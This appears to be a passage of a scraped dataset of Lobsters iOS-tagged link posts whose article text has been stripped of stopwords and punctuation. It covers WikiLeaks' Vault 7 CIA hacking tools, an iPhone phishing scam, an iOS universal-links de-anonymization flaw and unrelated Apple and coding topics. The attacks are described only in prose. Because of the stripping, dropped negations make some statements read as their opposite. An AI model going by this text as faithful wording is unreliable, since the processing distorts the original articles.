intelligence cyber criminal independently discover hear rumor vulnerability cia discover vulnerability others u government commitment vulnerability equity process came significant lobbying u technology company risk losing share global market real perceived hidden vulnerability government stated would disclose pervasive vulnerability discovered ongoing basis year zero document show cia breached obama administration commitment many vulnerability used cia cyber arsenal pervasive may already found rival intelligence agency cyber criminal example specific cia malware revealed year zero able penetrate infest control android phone iphone software run run presidential twitter account cia attack software using undisclosed security vulnerability zero day possessed cia cia hack phone everyone else obtained discovered vulnerability long cia keep vulnerability concealed apple google make phone fixed phone remain hackable vulnerability exist population large including u cabinet congress top ceo system administrator security officer engineer hiding security flaw manufacturer like apple google cia ensures hack everyone mdsh expense leaving everyone hackable cyberwar program serious proliferation risk cyber weapon possible keep effective control nuclear proliferation restrained enormous cost visible infrastructure involved assembling enough fissile material produce critical nuclear mass cyber weapon developed hard retain cyber weapon fact computer program pirated like since entirely comprised information copied quickly marginal cost securing weapon particularly difficult since people develop use skill exfiltrate copy without leaving trace sometimes using weapon organization contain substantial price incentive government hacker consultant obtain copy since global vulnerability market pay hundred thousand million dollar copy weapon similarly contractor company obtain weapon sometimes use purpose obtaining advantage competitor selling hacking service last three year united state intelligence sector consists government agency cia nsa contractor booz allan hamilton subject unprecedented series data exfiltrations worker number intelligence community member yet publicly named arrested subject federal criminal investigation separate incident visibly february u federal grand jury indicted harold martin iii count mishandling classified information department justice alleged seized gigabyte information harold martin iii obtained classified program nsa cia including source code numerous hacking tool single cyber weapon loose spread around world second used peer state cyber mafia teenage hacker alike u consulate frankfurt covert cia hacker base addition operation langley virginia cia also us u consulate frankfurt covert base hacker covering europe middle east africa cia hacker operating frankfurt consulate center cyber intelligence europe ccie given diplomatic black passport state department cover instruction incoming cia hacker make germany counterintelligence effort appear inconsequential breeze german custom coverforaction story pat stamp passport cover story trip q supporting technical consultation consulate two earlier wikileaks publication give detail cia approach custom secondary screening procedure frankfurt cia hacker travel without border check european country part shengen open border area including france italy switzerland number cia electronic attack method designed physical proximity attack method able penetrate high security network disconnected internet police record database case cia officer agent allied intelligence officer acting instruction physically infiltrates targeted workplace attacker provided usb containing malware developed cia purpose inserted targeted computer attacker infects exfiltrates data removable medium example cia attack system fine dining provides decoy application cia spy use witness spy appears running program showing video eg vlc presenting slide prezi playing computer game even running fake virus scanner kaspersky mcafee sophos decoy application screen underlaying system automatically infected ransacked cia dramatically increased proliferation risk surely one astounding intelligence goal living memory cia structured classification regime market valuable part vault cia weaponized malware implant zero day listening post lp command control system agency little legal recourse cia made system unclassified cia chose make cyberarsenal unclassified reveals concept developed military use easily crossover battlefield cyber war attack target cia usually requires implant communicate control program internet cia implant command control listening post software classified cia officer could prosecuted dismissed violating rule prohibit placing classified information onto internet consequently cia secretly made cyber spyingwar code unclassified u government able assert copyright either due restriction u constitution mean cyber arm manufacture computer hacker freely pirate weapon obtained cia primarily rely obfuscation protect malware secret conventional weapon missile may fired enemy ie unsecured area proximity impact target detonates ordnance including classified part hence military personnel violate classification rule firing ordnance classified part ordnance likely explode operator intent last decade u hacking operation increasingly dressed military jargon tap department defense funding stream instance attempted malware injection commercial jargon implant drop nsa jargon called fire weapon fired however analogy questionable unlike bullet bomb missile cia malware designed live day even year reached target cia malware explode impact rather permanently infests target order infect target device copy malware must placed target device giving physical possession malware target exfiltrate data back cia await instruction malware must communicate cia command control system placed internet connected server server typically approved hold classified information cia command control system also made unclassified successful attack target computer system like series complex stock maneuver hostile takeover bid careful planting rumor order gain control organization leadership rather firing weapon system military analogy made infestation target perhaps akin execution whole series military maneuver target territory including observation infiltration occupation exploitation evading forensics antivirus series standard lay cia malware infestation pattern likely assist forensic crime scene investigator well apple microsoft google samsung nokia blackberry siemens antivirus company attribute defend attack tradecraft donts contains cia rule malware written avoid fingerprint implicating cia u government witting partner company forensic review similar secret standard cover use encryption hide cia hacker malware communication pdf describing target exfiltrated data pdf well executing payload pdf persisting pdf target machine time cia hacker developed successful attack well known antivirus program documented av defeat personal security product detecting defeating psps pspdebuggerre avoidance example comodo defeated cia malware placing window recycle bin comodo gaping hole doom cia hacker discussed nsa equation group hacker wrong cia malware maker could avoid similar exposure example cia engineering development group edg management system contains around different project documented year zero subprojects malware hacker tool majority project relate tool used penetration infestation implanting control exfiltration another branch development focus development operation listening post lp command control system used communicate control cia implant special project used target specific hardware router smart tv example project described see table content full list project described wikileaks year zero umbrage cia hand crafted hacking technique pose problem agency technique created form fingerprint used forensic investigator attribute multiple different attack entity analogous finding distinctive knife wound multiple separate murder victim unique wounding style creates suspicion single murderer responsible soon one murder set solved murder also find likely attribution cia remote device branch umbrage group collect maintains substantial library attack technique stolen malware produced state including russian federation umbrage related project cia increase total number attack type also misdirect attribution leaving behind fingerprint group attack technique stolen umbrage component cover keyloggers password collection webcam capture data destruction persistence privilege escalation stealth antivirus psp avoidance survey technique fine dining fine dining come standardized questionnaire ie menu cia case officer fill questionnaire used agency osb operational support branch transform request case officer technical requirement hacking attack typically exfiltrating information computer system specific operation questionnaire allows osb identify adapt existing tool operation communicate cia malware configuration staff osb function interface cia operational staff relevant technical support staff among list possible target collection asset liason asset system administrator foreign information operation foreign intelligence agency foreign government entity notably absent reference extremist transnational criminal case officer also asked specify environment target like type computer operating system used internet connectivity installed antivirus utility psps well list file type exfiltrated like office document audio video image custom file type menu also asks information recurring access target possible long unobserved access computer maintained information used cia jqjimprovise software see configure set cia malware suited specific need operation improvise jqjimprovise improvise toolset configuration postprocessing payload setup execution vector selection surveyexfiltration tool supporting major operating system like window bartender macos jukebox linux dancefloor configuration utility like margarita allows noc network operation center customize tool based requirement fine dining questionairies hive hive multiplatform cia malware suite associated control software project provides customizable implant window solaris mikrotik used internet router linux platform listening post lp command control infrastructure communicate implant implant configured communicate via http webserver cover domain operation utilizing implant separate cover domain infrastructure handle number cover domain cover domain resolve ip address located commercial vps virtual private server provider publicfacing server forward incoming traffic via vpn blot server handle actual connection request client setup optional ssl client authentication client sends valid client certificate implant connection forwarded honeycomb toolserver communicates implant valid certificate missing case someone try open cover domain website accident traffic forwarded cover server delivers unsuspicious looking website honeycomb toolserver receives exfiltrated information implant operator also task implant execute job target computer toolserver act command control server implant similar functionality though limited window provided rickbobby project see classified user developer guide hive frequently asked question wikileaks published soon verification analysis ready febuary trump administration issued executive order calling cyberwar review prepared within day review increase timeliness relevance publication play role setting publication date redaction name email address external ip address redacted released page redaction total analysis complete overredaction item may redacted employee contractor target otherwise related agency example author documentation otherwise public project used agency identity v person redacted name replaced user id number allow reader assign multiple page single author given redaction process used single person may represented one assigned identifier identifier refers one real person archive attachment zip targz replaced pdf listing file name archive archive content assessed may made available archive redacted attachment binary content replaced hex dump content prevent accidental invocation binary may infected weaponized cia malware content assessed may made available content redacted ten thousand routable ip address reference including thousand within united state correspond possible target cia covert listening post server intermediary test system redacted exclusive investigation binary file nonpublic origin available dump prevent accidental invocation cia malware infected binary organizational chart organizational chart corresponds material published wikileaks far since organizational structure cia level directorate public placement edg branch within org chart agency reconstructed information contained document released far intended used rough outline internal organization please aware reconstructed org chart incomplete internal reorganization occur frequently wiki page year zero contains web page attachment internal development groupware software used purpose called confluence proprietary software atlassian webpage system like wikipedia version history provide interesting insight document evolved time document include page history latest version order named page within level determined date oldest first page content present originally dynamically created confluence software indicated reconstructed page time period covered year sort order page within level determined date oldest first wikileaks obtained cia creationlast modification date page yet appear technical reason usually date discerned approximated content page order critical know exact timedate contact wikileaks vault vault substantial collection material cia activity obtained wikileaks part vault obtained part one obtained recently cover detail part available time publication part vault different source detail part available time publication total size vault series largest intelligence publication history wikileaks obtain part vault source trust wikileaks reveal information might help identify nt wikileaks worried cia act staff stop series would certainly counterproductive wikileaks already mined best story wikileaks intentionally written hundred impactful story encourage others find create expertise area subsequent part series look demonstrate journalistic excellence may considered early access future part wo nt journalist find best story unlikely considerably story journalist academic position write
301,Lobsters,ios,Apple iOS,"xmake v2.1.1 released, support golang, dlang and rust languages",http://www.tboox.org/2017/03/04/update-v2.1.1/,xmake released support golang dlang rust language,,
302,Lobsters,ios,Apple iOS,iPhone Robbers Try to iPhish Victims,https://krebsonsecurity.com/2017/02/iphone-robbers-try-to-iphish-victims/,iphone robber try iphish victim,edu rabin find iphone app icloudcomfind apple advice apple edu rabin findmyiphone iphone r,another strange tale kineticattackmeetscyberattack department earlier week heard loyal reader brazil whose wife recently mugged three robber nabbed iphone long husband texted stolen phone offering buy back locked device soon began receiving text message stating phone found begin process retrieving device click texted link log phishing page mimicking apple site edu rabin resident porto alegre capital largest city brazilian state rio grande sul southern brazil rabin said three thug robbed wife last saturday broad daylight thankfully unharmed wanted iphone rabin said tried locate device using find iphone app already nearby city crime rate even higher mine rabin said said used phone send robber message offering buy back wife phone sent message phone number saying dear mister robber since really use phone preparing rebuy best happened saturday sunday checked search app phone still offline place following day began receiving text message stating phone recovered monday started receive sm message saying iphone found url reach rabin said screenshot one text link led page look exactly like brazilian version apple signin page hosted site allows free web hosting rabin said fall ruse imago scam would trick quite people lost iphone anxious get back leave icloud end texted url see phony copy apple find iphone login page still live hosting provider notified find iphone phishing page used robber scammer stop trying phish apple id password iphone account rabin said two day later received odd automated call mobile came strange number voice sounding like siri google waze voice informing iphone found look sm info rabin said thought tell story someone really got another level connecting lowest kind criminal high profile one probably went school college buy even create kind scam high cost smart phone make mobile device theft serious problem everywhere world brazil use apple device good idea turn find iphone feature using find iphone app device get lost located signing icloudcomfind apple device lost stolen check apple advice manage loss depending severity situation rabin case even though phone currently turned option put lost mode lock remotely erase next time device online action take effect also try make habit regularly syncing device computer event phone lost stolen data backed worry remotely wiping important data may already saved locally tag apple edu rabin findmyiphone iphone entry posted friday february pm filed follow comment entry r feed comment ping currently closed
303,Lobsters,ios,Apple iOS,FBI Under Pressure to Reveal Cost of San Bernardino iPhone Hack,http://wccftech.com/fbi-reveal-cost-san-bernardino-iphone-hack/,fbi pressure reveal cost san bernardino iphone hack,spent unlock iphone used one san bernardino shooter fbi time share real detail much paid google photo latest update let edit portrait mode depth older iphone model director james comey dropped hint apple ordered heavily redacted potentially compromise security american pay public fund,yes iphone least three organization want know exactly much federal bureau investigation fbi spent unlock iphone used one san bernardino shooter fbi time share real detail medium organization including associated press vice medium llc usa todayowner gannett submitted court filing monday force government reveal much paid get iphone unlocked google photo latest update let edit portrait mode depth older iphone model tothe news organization said filing nt seeking information could put national security risk stressed adequate justification continue withhold information much paid tool identity vendor responsible designing io security circumvention tool undisputed vendor developed iphone access tool government identified rational reason knowing vendor identity linked way substance tool fbi refrained disclosing name security firm individual assisted agency unlocking notorious iphone time though fbi director james comey dropped hint saying cost would make duration job roughly million going thirdparty security vendor crack open iphone apple ordered help agency unlocking device leading huge backlash consumer privacy advocate tech firm said agency force company weaken security measure three organization sued fbi september information following agency released heavily redacted document last month cost vendor detail remained redacted leading monday filing according legal team representing news outlet rational reason information would put national security risk fact would enable public learn tool could potentially compromise security american release information go heart freedom information act purpose allowing public ass government activity decision pay public fund outside entity possession tool compromise digital security million american lawyer said
304,Lobsters,ios,Apple iOS,Rendering an SVG elliptical arc as bezier curves,https://mortoray.com/2017/02/16/rendering-an-svg-elliptical-arc-as-bezier-curves/,rendering svg elliptical arc bezier curve,smooth sexy curve bezier spline stuffing curve box calculating bound svg arc notation fuse endpoint center point conversion square root arc cosine arc beziers drawing elliptical arc using polylines quadratic cubic curve parametrics paper joe cridge ellipse smooth sexy curve bezier spline fuse follow twitter facebook let know appendix endpoint center arc conversion like,needed draw ellipsis arc vector api complete without though opinion seem differ apple core graphic lack anything axis aligned circular arc android allows ellipse seems also restrict axis aligned mean needed convert ellipse series bezier curve backing apis see also smooth sexy curve bezier spline stuffing curve box calculating bound series svg arc notation svg arc command allows type arc one might want draw since fuse old path control already allowed svg path data seemed logical use definition arc svg specifies arc end point start end combined radius rotation ellipse parameter four potential arc could drawn two atfirstoddlooking flag included select one radiusx radiusy xaxisrotation largearcflag sweepflag x great way specify arc drawing perspective know two point connect know sweep angle want problem good way actually draw arc need converted give u center point range angle drawn endpoint center point conversion svg appendix elliptical arc implementation note conversion endpoint center parametrization algorithm helpful since arc notation bit uncommon hard find algorithm elsewhere got problem however example arc standard actually fail patching required square root first problem square root square root fails produce imaginary number becomes nan given negative value happens whenever input radius large enough connect two end point ellipse even source number consistent floating point precision error result number slightly negative sqrt unforgiving sqrt sqrt nan patched follows spec separate problem case happens given ratio given ratio quite easy scale radius multiply radius reduces value exactly floating point precision notwithstanding resulting full function end article still sqrt max pq due precision pq value could still negative scaling r actually practice slight negative appeared arc cosine algorithm also involves calculating angle two vector though already function calculate decided use equation ensure part worked intended normally worry division prefiltering algorithm ensures nonzero length guarantee operand arccos valid due floating point precision value might slightly greater slightly le arccos course unforgiving return nan case correct result would imaginary number code added clamp prevent clamp valid since theoretically equation producing value outside range angle measured fixed range value outofrange value getting eversoslightly range arc beziers use center point notation convert arc series bezier curve involves many thing parametric form ellipse equation derivative complex formula derive thankfully lmaisonobe work paper drawing elliptical arc using polylines quadratic cubic curve read translate code parametrics first bit getting parametric equation ellipse classic definition point ellipse look like tell u given x point resides edge ellipse useful drawing ellipse instead want get parametric form function take value respresents pseudoangle ellipse return x coordinate includes rotation ellipse away xaxis required svg arc static public ellipticarcpoint c r float xangle float return cx rx mathcos xangle mathcos ry mathsin xangle mathsin cy rx mathsin xangle mathcos ry mathcos xangle mathsin mentioned pseudoangle really proper angle angle formed one think ellipse circle stretched rotated word ofs svg specification purpose equation form iterate starting ending angle arc definition find point ellipse second function called ellipticarcderivative provides derivative two function let u calculate bezier curve approximates section arc following table maisonobe paper need ellipticarcpoint function ellipticarcderivative function start end angle arc approximating subdivide angle range small section get good approximation quite understand paper error calculation found another paper joe cridge indicating division provides potential one pixel error fairly high resolution device chose ensure smooth animation even partial arc high density mobile device ellipse putting together able render example svg build vector api started previous article smooth sexy curve bezier spline working backend apple core graphic code also run android canvas window systemdrawing calculating bezier curve need limit backend arc drawing ability one article series come still need calculate bound shape another adventure derivative work fuse full interesting coding follow twitter facebook get insight anecdote something particular crossplatform tool pique curiosity let know appendix endpoint center arc conversion uno code article publishing time used convert svg arc center point notation perform endpoint center arc parameter conversion detailed svg spec conversion endpoint center parameterization param r must ref case need scaled per svg spec internal static void endpointtocenterarcparams ref r float xangle bool flaga bool flag c angle double rx mathabs rx double ry mathabs ry double double double mathcos xangle mathsin xangle double mathsin xangle mathcos xangle double rxs rx rx double rys ry ry double double check radius small pq dq rxs rys see cr ratio dq rxs rys double cr cr scale rx ry equally cr var mathsqrt cr rx rx ry ry rxs rx rx rys ry ry double dq rxs rys double pq rxs rys dq dq double q mathsqrt mathmax pq use max account float precision flaga flag q q double cxp q rx ry double cyp q ry rx double cx mathcos xangle cxp mathsin xangle cyp double cy mathsin xangle cxp mathcos xangle cyp double theta svgangle rx cyp ry double delta svgangle cxp rx cyp ry cxp rx ry delta mathmod delta mathpif flag delta mathpif r float rx float ry c float cx float cy angle float theta float delta static float svgangle double ux double uy double vx double vy var u float ux float uy var v float vx float vy var dot vectordot u v var len vectorlength u vectorlength v var ang mathacos mathclamp dot len floating point precision slightly value appear ux vy uy vx ang ang return ang like like loading related
307,Lobsters,ios,Apple iOS,iOS Universal Links and Privacy,https://jcs.org/notaweblog/2017/02/14/ios_universal_links_and_privacy/,io universal link privacy,universal link ebay app link background http twittercomjcs privacy implication kind confusing endless onion browser neutered function exploiting mitigation implemented version endless firefox bug nevpnmanager netunnelprovider,introduced io universal link allow io developer claim ownership domain name including wildcards processed io app io user tap link url domain name app safari mail user party app installed party app immediately launched service url web browsing apps io route traffic vpns tor feature cause traffic sent outside vpntor network without warning instance one ebay app installed tap link within safari web browsing app io ebay app opened load auction page background universal link feature created solve problem apps implement custom url scheme like twitter user screennamejcs order get link open io app problem custom scheme user twitter app installed io would present vague error user know install twitter app store universal link twitter claim ownership twittercom present standard link like http twittercomjcs user twitter io app installed opened show particular page user directed safari load mobile view url privacy implication ui kind confusing also present unique problem certain io apps like offering vpn torwrapped web browser web browser engine either uiwebview used endless browser well onion browser tob probably every tor app io wkwebview used chrome firefox brave etc offer indication url universal link whether opened party app user may browsing tor app accidentally tapping particular link could immediately open party app make request url outside tor user able stop since app containing link determine universal link present user dialog confirmation opening party app immediate without warning old custom url scheme easy determine checking url scheme http http presenting dialog unfortunately io probably never get api determine link open universal link reason neutered canopenurl function could abused party apps quickly determine party apps installed device iterating list popular universal link domain exploiting since universal link domain registered mobilesafari way found construct normal http http link immediately open arbitrary url however would hard find popular party app universal link domain associated display usercontrolled content loaded party server user interaction example ebay auction page custom html even javascript insane reason would trivial attacker create auction listing add img tag pointing server controlled attacker wait target using tor app tap link point ebay auction long target ebay app installed device would open ebay app url load image reveal real ip server mitigation implemented workaround problem endless available version released yesterday rejecting toplevel url request come uiwebview delegate assuming domain universal link issuing new request uiwebview url since universal link triggered toplevel request image loaded page ajax request etc hack appears enough get uiwebview interpret click universal link request since technically canceled processed breaking interpage functionality test page various link using ebay url test ebay app installed however endless normal web browser vpn tor encapsulation network request endless ebaycom url mostly one made ebay app reasoning working around universal link mostly usability keep browser session going app much like firefox bug exploited tor browser get make network request outside tor network vpn tor apps io implementing web browser relying encryption done inside app always going playing catchup new io bug feature universal link vpns tor apps think properly secure solution io o level nevpnmanager netunnelprovider network traffic sent endpoint regardless app browser originated
308,Lobsters,ios,Apple iOS,How to build cross-platform mobile apps using nothing more than a JSON markup,https://medium.freecodecamp.com/how-to-build-cross-platform-mobile-apps-using-nothing-more-than-a-json-markup-f493abec1873,build crossplatform mobile apps using nothing json markup,build crossplatform mobile apps using nothing json markup crossplatform native io android jasonette json markup model view controller basic structure predefined convention design philosophy native cross platform autolayout visual format language simple yet expressive scrolling list vertical horizontal implementation vertical section uitableview recyclerview uitableviewcells uilabel textview storyboards xml layout file implementation horizontal section type horizontal uicollectionview crossplatform native simple expressive uistackview linearlayout cs flexbox vertical component horizontal layer aka absolute positioning beyond view view write full declarative program json view model controller anything possible raspberry pi web app nodejs app rail app django app php app really web app even need server turn html website app cheerio library photo sharing app githubcom eliza chatbot app jasonetteelizaexample githubcom microblog app jasonettetokenauthenticationexample githubcom remotecontrol slack bot json blogjasonettecom gliechtensteiniosdevweeklyjson githubcom conclusion io version android version already grown vibrant community contributor maker io android contribution superwelcome,ethanhow build crossplatform mobile apps using nothing json markupfor past month working new way build crossplatform native io android apps called jasonetteit let describe entire app nothing single json markupif app consists entirely json treated like data served remotely cloud ondemandthe app logic longer need hardcoded device update much want updating json serverside app freshly loaded server every time open itcheck video quick intro jasonette many different part express function template style using json markup result write supersophisticated native mobile app fully model view controller mannerin post show specifically view part jasonette express various crossplatform ui pattern jsonhow implement jsontonative mapping internallybasic structureunder hood jasonette work similarly web browser instead interpreting html markup drawing web view jasonette fetch json markup construct native view ontheflythe markup json file follows predefined convention first start jason key two child head body look like jason head metadata document body actual content displayed view design philosophywhen first started designing json syntax describing native view couple constraint mind native reason io android came native layout system layout system designed desktop era always translate well small device world syntax express underlying layout mobile native manner possiblecross platform yet need cross platform example io something called autolayout visual format language implemented natively android right solutionsimple yet expressive easily expressed simple json format easy compose sophisticated structurewhen take look mobile apps built boil small number common interface pattern vertically scrolling listhorizontally scrolling listabsolute positioninggridlet take look first three since widely usedthe frequently used ui pattern scrolling list jasonette call sectionsthere two type section vertical horizontal vertical section scroll vertically horizontal section horizontallya single vertical section multiple item left multiple horizontal section right implementation vertical sectionsthis probably frequently used ui displaying data mobile device io jasonette implement uitableview android implemented recyclerview body section item type label text item type label text item type label text item io json markup creates uitableview three uitableviewcells contains uilabel corresponding text attributeson android creates recyclerview three item textview display corresponding text attributesall constructed programmatically without use storyboards io xml layout file android order make sure every detail programmable dynamicallyimplementation horizontal sectionssyntaxwise horizontal section much different need set type horizontal item flow horizontally body section type horizontal item type label text item type label text item type label text item note syntax horizontal section simple internally actually quite complex horizontal section io implemented uicollectionview wellknown technique basically horizontally scrolling uicollectionview embedded parent uitableview scroll vertically android implemented similar manner using nested recyclerviews insteadnow understand top level view structured let look item section made multiple unit scrollable item note item fixed dimension nothing inside item scrollsan item single component like label image button textarea etca combination componentsimplementing part straightforward section implementation choose crossplatform native simple expressive way form supersophisticated layoutthankfully io android similar native layout system called uistackview linearlayout respectively layout scheme turn similar cs flexbox would say crossplatform getlastly layout system infinitely composable seen create vertical layout horizontal layout nest vertical layout within horizontal layout forth recursivelyto create vertical layout would set type vertical set component item type vertical component type label text first type label text second type label text third thing horizontal layout set type horizontal instead item type horizontal component type image url http type label text rick nesting layout simple specifying layout another layout component item type horizontal component type image url http type vertical component type label text user type label text rick talked styling feature sake brevity style individual component well layout make sure layout look exactly like wanted need add style object describing font size width height color background cornerradius opacity layer aka absolute positioning sometimes may want position item exactly certain part screen without scrolling cssterms would call absolute positioning jasonette support called layerscurrently layer support two type child component image label place component anywhere desire screen way example jasonette app layer itemsin example two label temperature weather message image camera icon screen whose coordinate explicitly set make sure stay place without scrolling markup would look something like jason body style background camera layer type label text style font helveticaneuelight size top left width align center type label text cloud style font helveticaneue size type image url http camera style bottom width color ffffff right amazingly enough need know order build kind sophisticated view imagine mobile devicesjust like build anything simple lego block compose basic component layout different way create sophisticated viewhere example built composing aforementioned ui element beyond viewsif read far may either thinking wow cool wan na try yeah probably build toy app way build production app using way like briefly mentioned view part jasonette simplest part really powerful jasonette actually go much write full declarative program jsonyou attach action ui element get triggered user touch also trigger action one another via successerror callback also listen certain event automatically trigger actionsjust like describe view also model controller logic json anythingwhat possible since need server sends json jasonette completely platform agnostic proprietary server technology need depend need jsonand json come anywhere local device remote server even raspberry pi web app already web app instantly build mobile native app nodejs app rail app django app php app really web app making request api endpointyou even need server since fit entire modelviewcontroller single selfcontained json file pretty much store serve anywhere even create app static json file served pastebin github turn html website app jasonette powerful htmltojson parser powered cheerio library let transform html json object already know json build native view transformed json way build native app website even api course recommended way use json whenever really cool regardlessi go forever example photo sharing app let take photo using device camera upload post entry server creating feed jasonette app uploading image using networkuploadgithubcoma nodejs powered eliza chatbot app io android jasonetteelizaexampleelizaexample eliza app iphonegithubcoma microblog app complete session management jasonettetokenauthenticationexampletokenauthenticationexample jasonette microblog app built rail server side using devise remote control app slack bot remotecontrol slack bot jsona couple day ago shaunymca shared really cool project slack channel think example app turn html web page json turn native app gliechtensteiniosdevweeklyjsoniosdevweeklyjson native app io dev weekly wrrten pure jsongithubcomconclusionjasonette young project opensourced io version late android version month laterbut already grown vibrant community contributor maker active development hope technology empower anyone developer build apps effortlesslysounds good check website herelast least find github repository io android contribution superwelcome
309,Lobsters,ios,Apple iOS,The Story Behind Apple‚Äôs Newton,http://lowendmac.com/2013/the-story-behind-apples-newton/,story behind apple newton,john sculley steve job knowledge navigator handwriting recognition steve sakoman hp portable macintosh mac plus mac se mac ii jean louis gass√©e mitch kapor newton project steve capps hobbit debugging software financial problem macintosh classic michael spindler trouble newton andy hertzfeld bill atkinson hypercard applelink general magic research project marketable product mike markkula focus star trek pink goodbye hobbit hello arm arm bbc microcomputer intel motorola bob dylan dylan thomas broad base wizard john sculley evangelist delay demo apple consumer electronics division newton untethered amstrad penpad amstrad penpad alpha beta sculley spindler top newton production reading bibliography like,late apple appeared middle resurgence john sculley forced volatile steve job cadre older experienced executive focused building apple macintosh brand company beginning grow complacent working protect macintosh revenue cost interoperability new technology john sculley john sculley apple ceo toyed idea creating macintoshkiller commissioned two high budget video mockups product called knowledge navigator right knowledge navigator going tablet size opened magazine would sophisticated artificial intelligence machine would anticipate need act one video showed college professor working device effortlessly prepare lecture computer created graphic simulated different model sculley believed device would next big thing computer industry desperately wanted apple company develop handwriting recognition steve sakoman especially cognizant apple dependence macintosh sakoman hp worked alternative input device centered around different configuration keypad hoped eventually keyboard would rendered obsolete people would use touchscreen interact computer equipped handwriting recognition software hp uninterested handwriting recognition sakoman assigned help design hp portable right one earliest laptop steve job hired sakoman help work laptop version macintosh successful release hp portable job left apple laptop plan scrapped sakoman helped lead team creating mac plus mac se mac ii found work uninteresting however wanted leave apple work handheld computer recruited jean louis gass√©e lead brand new company would bankrolled lotus founder mitch kapor plan fell since appeared apple would probably sue nascent company newton project keep talented sakoman defecting gass√©e proposed creating skunk work project create apple handheld computer gass√©e got permission start project sculley without telling researched sakoman set work first thing select name project apple original logo right rendering isaac newton sitting beneath apple tree sakoman decided name project newton sakoman gathered team engineer including finder coauthor steve capps moved abandoned warehouse bubb road cupertino vein macintosh team almost decade newton researcher started work specification tablet computer sakoman end goal newton create tablet computer priced desktop computer would size folded sheet paper x would cursive handwriting recognition special user interface run enormously demanding handwriting recognition software tablet would three hobbit processor sakoman capps feared project would balloon scope ultimately create something expensive would flop worst sakoman fear came true engineer restriction size cost started piling feature onto product first newton would sized slate hard drive active matrix lcd infrared high speed long distance networking named figaro product would cost well released debugging software two year newton researcher toiled away creating mockups sample software several prototype tablet assembled running buggy software major hanging point handwriting recognition incredibly difficult create handwriting recognition software able adapt different writing style fate intervened bizarre way one night apple vp board relation al eisenstat moscow heard frantic knocking door answered saw nervous programmer scanning hallway see followed programmer handed eisenstat floppy disk containing handwriting recognition software quickly left eisenstat returned state gave code gass√©e turn gave code newton team recognition remarkably accurate actually adapted learn different letter shape learned read user handwriting financial problem end sense foreboding around apple growth slowed markedly apple sale grown billion sale barely grew million apple strategy releasing highend product incredibly profit margin higher pc manufacturer beginning fail sculley knew gass√©e long defended practice profit pushed division actually took step prevent apple losing high profit margin entering low end claris started project called drama create another brand sell lowend mac drama got far contracting nissan design create enclosure gass√©e killed project reasoned consumer would willing pay much macintosh experience release enormously successful macintosh classic apple cheapest mac imac hit u meteoric growth compaq gateway dell gass√©e strategy started developing crack long assumed gass√©e would succeed sculley ceo instead became scapegoat apple stunted growth michael spindler named coo year enormously popular del yocam forced gass√©e gass√©e felt snubbed march resigned gass√©e took sakoman found inc would help design bebox trouble newton sakoman left newton trouble advanced technology group think tank inside apple former gass√©e fief product similar figaro developed marc porat created number document describing concept called agent small program would travel around network gathering information present user even act without intervention apple would provide software called paradigm paradigm shift would predicate hardware pocket crystal outside company would provide wireless network content pocket crystal appeared pose significant threat newton project two mac heavyweight working project andy hertzfeld bill atkinson sculley sent larry tesler ass newton project see anything could used pocket crystal tesler researcher xerox palo alto research center parc left shortly job toured lab apple helped design lisa interface named apple fellow tesler impressed newton project time figaro three processor battery ran nonstop week time weighed eight pound little uneasy price much unix workstation newton engineer responded incredulity making case could compromise figaro succeed capps created mock newton software using hypercard showed tesler immediately impressed threw support behind newton quickly took control group insure newton continued survival sakoman team create detailed demonstration show sculley rest board along marketing plan michael tchao marketing manager joined newton project week sakoman left containing specification price possible newton product sculley enamored newton especially newton intelligence allowed software anticipate behavior user act assumption example newton would filter applelink email hyperlink name address book search email date time ask user schedule event pocket crystal fell favor sculley quickly spun general magic company enjoyed early success languished eventually sold intellectual property microsoft research project marketable product sculley set ship date newton ending status research project newton handheld cost le would ready april tchao came three newton model first one released larger version figaro tablet renamed senior senior would x cost around year senior debuted two smaller newton would released midsize model quickly killed would measure x cost le smallest model junior would x cost around newton prototype lab engineering marketing staff favored junior tesler pushed senior believed underpowered device would set negative precedent future newton product tchao believed expensive senior would relegate newton early adopter vertical market consumer apple sway two faction throat tesler favored senior since included lot advanced feature favorite senior ability connect five unit simultaneously via infrared junior engineer great amusement derision feature would work room fluorescent lighting office would turn overhead light network newton tchao believed infrared prime example senior wrong newton focused bringing new technology consumer creating viable product conflict simmered month tchao found ally sculley two sharing ride mike markkula private jet tchao launched impassioned speech making case junior senior would actually harm newton sculley concurred instructed tesler shelve senior work release junior focus junior engineer pushed ahead software worked fervor mac team steve job would junior change apple would change world beyond apple engineer often recipient huge bonus stayed ahead schedule engineer working star trek apple first mac osonintel project given free vacation resort mexico successfully demonstrating project unusual engineer working hour every day operating system language development farmed another group atg based cambridge led ike nassi team worked language inspired ease use smalltalk language power c named ralph author ralph ellison language would licensed software developer would used primary language pink apple planned operating system goodbye hobbit hello arm development began bog became clear language would run efficiently hobbit processor sakoman selected three year hobbit developed low power risc processor meant used switching relay embedded application early specification sakoman created used three hobbit processor cut cost improve battery life reduced one processor powerful enough run demanding software besides asked apple invest million completion product tesler backed deal went small british company named arm along ford hobbit major customer arm started acorn computer manufacturer acorn made number phenomenally popular personal computer britain early reached apex success released bbc microcomputer official computer popular program computer programme machine based processor fine home application reaching limit advent computer graphic acorn hoped move new intel intel refused give acorn sample necessary design new computer outraged acorn started project led roger wilson create risc processor power new line archimedes computer running risc o team completed first machine arm acorn risc machine cpu performance comparable motorola used early mac half many transistor meant consumed le power generated le heat apple discovered arm september company bought stake arm split acorn subsequently renamed advanced risc machine apple would use chip newton tesler named arm board director apple representative arm popular processor world powering smartphones tablet new processor faster hobbit also efficient armequipped junior could much smaller since required le cooling space unfortunately fast enough run taxing ralph language language stripped run arm renamed dylan apple quickly ran trademark trouble new name officially stood dynamic language bob dylan named dylan thomas threatened sue apple using name without permission apple dylan eventually settled court undisclosed amount broad base apple want take newton plunge alone started looking partner ideally would several different newton device available launch different manufacturer beyond apple little experience building consumer device would much le expensive contract manufacturing outside company contacting matsushita sony apple settled sharp sharp already presence organizer market wizard company knew sell device besides sharp largest lcd manufacturer world sharp would build apple junior named messagepad release version called expertpad apple also reached agreement motorola siemens produce version shortly motorola released newtonpowered marco company would jump ship general magic magic cap operating system john sculley evangelist sculley losing interest daytoday operation apple actively involved newton pink year sculley campaigned hard bill clinton sculley lifelong republican sat next hillary clinton first state union speech campaigning sculley became de facto spokesman computer industry like steve job granted frequent interview sculley decided espouse value newton keynote speech ce la vega sculley never mentioned newton name made case personal digital assistant pda would one day become commonplace larger theme speech digital convergence predicted market device content would reach trillion end decade delay sculley painfully shy often ate lunch alone disliked making small talk excellent public speaker press ate word planned announce newton ce chicago summer along demonstration early version messagepad even close 